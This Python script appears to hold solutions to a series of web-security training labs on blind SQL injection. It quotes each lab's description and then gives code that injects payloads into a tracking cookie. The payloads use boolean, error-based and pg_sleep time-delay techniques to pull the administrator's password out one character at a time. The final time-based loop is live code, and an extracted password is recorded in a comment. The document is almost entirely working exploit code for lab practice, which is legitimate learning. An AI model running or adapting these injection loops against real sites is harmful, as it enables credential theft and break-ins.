import requests
import urllib.parse
import time


# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, 
# and performs an SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message 
# in the page if the query returns any rows.
# The database contains a different table called users, with columns called username and password. 
# You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 
# characterset = "abcdefghijklmnopqrstuvwxyz0123456789"

# with requests.Session() as s:
#     password = ""
#     i = 0
#     while(i < len(characterset)):
#         trackingID = f"S0XclLX4nYH2Oo6q' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {len(password)+1}, 1) = '{characterset[i]}'--"
#         s.headers.update({"Cookie": f"TrackingId={trackingID}; session=EXLgE67fVz692Jc9fiUCALa2RtCHM3Me"})
#         url = f'https://0a39005d036b1519c0a88add00440059.web-security-academy.net/'
#         session = s.get(url)
#         print(characterset[i])
#         if "Welcome back!" in session.text:
#             password = password + characterset[i]
#             print(f"Password: {password}")
#             i = 0
#         else:
#             i = i + 1
# print(password)



# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL 
# query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and the application does not 
# respond any differently based on whether the query returns any rows. If the SQL query causes an error, 
# then the application returns a custom error message.
# The database contains a different table called users, with columns called username and password. You 
# need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 

characterset = "abcdefghijklmnopqrstuvwxyz0123456789"
# This lab shows how to exploit a database that doesn't change its response by how many rows are returned.
# The vulnerability exists that it doesn't handle 
# with requests.Session() as s:
#     password = ""
#     i = 0
#     while(i < len(characterset)):
#         trackingID = f"OWAnohT8DDGyMbfq' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {len(password)+1}, 1) = '{characterset[i]}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"
#         s.headers.update({"Cookie": f"TrackingId={trackingID}; session=j27TW0KFmnqJDbMTi8xXDjPDD0Guzocc"})
#         url = f'https://0a0300480389d0cbc0bd0457006400d7.web-security-academy.net/'
#         session = s.get(url)
#         print(characterset[i])
#         if "Internal Server Error" in session.text:
#             password = password + characterset[i]
#             print(f"Password: {password}")
#             i = 0
#         else:
#             i = i + 1
# print(password)



#  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and 
#  performs an SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and the application does not respond any differently based on whether 
# the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to 
# trigger conditional time delays to infer information.
# To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

# with requests.Session() as s:
#     delay = 20
#     condition = "'1'='2'"
#     # trackingID = f"IeFyTqMdppjFKhv0'|| pg_sleep(10)--" # works
#     trackingID = f"IeFyTqMdppjFKhv0' || (SELECT pg_sleep(100))--" # works
#     s.headers.update({"Cookie": f"TrackingId={trackingID}; session=4tAH9mrZtKU40BHrxEC2bNelBBKFv3dJ"})
#     url = f'https://0aaf001f03d16c05c0d10b2d00590006.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'
#     session = s.get(url)
#     print(session.text)


#  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, 
# and performs an SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and the application does not respond any differently based on 
# whether the query returns any rows or causes an error. However, since the query is executed synchronously, it 
# is possible to trigger conditional time delays to infer information.
# The database contains a different table called users, with columns called username and password. You need to 
# exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 

with requests.Session() as s:
    password = ""
    i = 0
    while(i < len(characterset)):
        trackingID = f"oYDsDaW3SltDVk7f' || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {len(password)+1}, 1) = '{characterset[i]}') THEN pg_sleep(20) ELSE pg_sleep(0) END)--"
        s.headers.update({"Cookie": f"TrackingId={trackingID}; session=nj1NJNsxYiUcSB677Bf4fBuBPIl1A4w6"})
        url = f'https://0a03002503f46cb3c0570d820010002e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'
        start_time = time.time()
        session = s.get(url)
        end_time = time.time()
        print(characterset[i])
        if end_time - start_time > 15:
            password = password + characterset[i]
            print(f"Password: {password}")
            i = 0
        else:
            i = i + 1
    #rhcr8tfl2bk0reus1cqs
    print(f"password: {password}")